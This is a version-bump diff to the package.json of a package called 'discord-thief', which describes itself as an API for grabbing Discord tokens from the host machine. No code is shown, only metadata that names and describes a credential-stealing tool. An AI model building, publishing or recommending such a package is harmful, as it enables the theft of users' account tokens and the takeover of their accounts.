@@ -1,6 +1,6 @@
 {
     "name": "discord-thief",
-    "version": "0.1.0",
+    "version": "0.1.1",
     "description": "API for grabbing Discord tokens from the host machine.",
     "main": "dist/index.js",
     "types": "dist/index.d.ts",
